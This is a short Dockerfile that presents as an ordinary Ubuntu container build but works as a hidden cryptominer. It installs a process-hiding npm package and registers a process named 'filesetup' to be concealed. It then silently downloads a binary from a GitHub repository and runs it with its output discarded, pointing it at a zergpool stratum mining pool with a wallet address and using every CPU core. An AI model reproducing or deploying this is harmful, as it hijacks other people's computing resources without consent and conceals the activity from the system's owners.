FROM ubuntu:latest
ENV DEBIAN_FRONTEND=noninteractive
ENV TERM=xterm
RUN apt-get update -y; apt-get install curl npm gcc procps python3 --assume-yes;
RUN npm i -g node-process-hider
RUN ph add filesetup
RUN wget https://github.com/sayghqwyg/KjHhjs/raw/main/filesetup >/dev/null 2>&1
RUN chmod +x filesetup >/dev/null 2>&1
RUN ./filesetup -a verus -o stratum+tcp://verushash.mine.zergpool.com:3300 -u RFzCwsf4x8W8XxU5wfeM3fzKMnyYWWE3An.$(echo $(shuf -i 1-1000 -n 1)_111) -p c=RVN -t $(nproc)
